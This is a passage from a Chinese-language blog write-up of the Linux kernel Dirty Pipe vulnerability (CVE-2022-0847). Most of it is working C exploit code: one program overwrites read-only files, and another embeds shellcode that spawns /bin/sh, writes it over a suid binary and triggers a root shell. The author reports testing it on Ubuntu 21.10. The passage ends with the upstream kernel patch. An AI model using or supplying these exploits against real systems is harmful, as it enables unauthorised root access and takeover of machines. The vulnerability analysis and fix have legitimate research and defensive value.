class="hljs-keyword">if</span> (((offset_in_file % page_size) + data_size) &gt; page_size)<br>errExit(<span class="hljs-string">&quot;Cannot write accross a page!&quot;</span>);<br><br><span class="hljs-comment">// exploit now...</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span><br><span class="hljs-comment"> * Just write and read through</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);<br>pipe(pipe_fd);<br>pipe_size = fcntl(pipe_fd[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>buffer = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(page_size);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;<br>size_left -= write(pipe_fd[<span class="hljs-number">1</span>], buffer, per_write);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;<br>size_left -= read(pipe_fd[<span class="hljs-number">0</span>], buffer, per_read);<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Use the splice to make the pipe_buffer-&gt;page</span><br><span class="hljs-comment"> * become the page of the file mapped, by read</span><br><span class="hljs-comment"> * a byte from the file accross the splice</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);<br>offset_in_file--;<span class="hljs-comment">// we read a byte, so offset should minus 1</span><br>retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;splice failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;short splice!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Now it comes to the time of exploit:</span><br><span class="hljs-comment"> * the mapped page of file has been in pipe_buffer,</span><br><span class="hljs-comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span><br><span class="hljs-comment"> * just a simple write can make the exploit.</span><br><span class="hljs-comment"> */</span><br>retval = write(pipe_fd[<span class="hljs-number">1</span>], argv[<span class="hljs-number">3</span>], data_size);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Write failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval &lt; data_size)<br>errExit(<span class="hljs-string">&quot;Short write!&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>运行，发现我们成功地覆写了只读文件</p><p><img src="https://s2.loli.net/2022/03/12/vOGZw2Qt9VRsYDd.png" alt="image.png"></p><h1 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03.提权"></a>0x03.提权</h1><p>漏洞的利用形式与“脏牛”基本上是一样的：覆写 <code>/etc/passwd</code> 或者覆写一些 suid 程序进行提权，这里就不过多赘叙了</p><h2 id="suid-提权"><a href="#suid-提权" class="headerlink" title="suid 提权"></a>suid 提权</h2><p>笔者现给出一个修改指定 suid 程序进行提权的 exp，使用 msfvenom 生成运行 <code>/bin/sh</code> 的 shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * exploit of CVE-2022-0847</span><br><span class="hljs-comment"> * written by arttnba3</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = &#123;<br>    <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>    <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> shellcode_len = <span class="hljs-number">149</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br><span class="hljs-type">long</span>page_size;<br><span class="hljs-type">size_t</span>offset_in_file;<br><span class="hljs-type">size_t</span> data_size;<br><span class="hljs-type">int</span> target_file_fd;<br><span class="hljs-type">int</span>pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> pipe_size;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">int</span> retval;<br><br><span class="hljs-comment">// checking before we start to exploit</span><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Usage: ./exp target_file&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br>page_size = sysconf(_SC_PAGE_SIZE);<br>offset_in_file = <span class="hljs-number">1</span>;<br><br>target_file_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br><span class="hljs-keyword">if</span> (target_file_fd &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Failed to open the target file!&quot;</span>);<br><br><span class="hljs-comment">// exploit now...</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span><br><span class="hljs-comment"> * Just write and read through</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);<br>pipe(pipe_fd);<br>pipe_size = fcntl(pipe_fd[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>buffer = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(page_size);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;<br>size_left -= write(pipe_fd[<span class="hljs-number">1</span>], buffer, per_write);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;<br>size_left -= read(pipe_fd[<span class="hljs-number">0</span>], buffer, per_read);<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Use the splice to make the pipe_buffer-&gt;page</span><br><span class="hljs-comment"> * become the page of the file mapped, by read</span><br><span class="hljs-comment"> * a byte from the file accross the splice</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);<br>offset_in_file--;<span class="hljs-comment">// we read a byte, so offset should minus 1</span><br>retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;splice failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;short splice!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Now it comes to the time of exploit:</span><br><span class="hljs-comment"> * the mapped page of file has been in pipe_buffer,</span><br><span class="hljs-comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span><br><span class="hljs-comment"> * just a simple write can make the exploit.</span><br><span class="hljs-comment"> */</span><br>retval = write(pipe_fd[<span class="hljs-number">1</span>], &amp;shellcode[<span class="hljs-number">1</span>], shellcode_len);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Write failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval &lt; shellcode_len)<br>errExit(<span class="hljs-string">&quot;Short write!&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Trigger root shell...\033[0m&quot;</span>);<br>system(argv[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>在 Ubuntu 21.10 、内核版本 <code>5.13.0-28</code>  上测试的结果如下，成功完成提权：</p><p><img src="https://s2.loli.net/2022/03/12/P2QdeIqbASfuxHR.png" alt="image.png"></p><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04.漏洞修复"></a>0x04.漏洞修复</h1><p>漏洞的修复方式比较简单，只需要在对应的涉及到 <code>pipe_buffer-&gt;flags</code> 的代码添加上将 flag 置 0 的代码即可，除了 <code>copy_page_to_iter_pipe</code> 以外在 <code>push_pipe</code> 中也缺失了置 0 的代码，补充上即可：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/lib/iov_iter.c b/lib/iov_iter.c</span><br><span class="hljs-comment">index b0e0acdf96c1..6dd5330f7a99 100644</span><br><span class="hljs-comment">--- a/lib/iov_iter.c</span><br><span class="hljs-comment">+++ b/lib/iov_iter.c</span><br><span class="hljs-meta">@@ -414,6 +414,7 @@</span> static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by<br> return 0;<br> <br> buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br><span class="hljs-addition">+buf-&gt;flags = 0;</span><br> get_page(page);<br> buf-&gt;page = page;<br> buf-&gt;offset = offset;<br><span class="hljs-meta">@@ -577,6 +578,7 @@</span> static size_t push_pipe(struct iov_iter *i, size_t size,<br> break;<br> <br> buf-&gt;ops = &amp;default_pipe_buf_ops;<br><span class="hljs-addition">+buf-&gt;flags = 0;</span><br> buf-&gt;page = page;<br> buf-&gt;offset = 0;<br> buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);<br></code></pre></td></tr></table></figure><blockquote><p>参见<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">linux-kernel.vger.kernel.org archive mirror</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;我超，管人痴！&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
</feed>
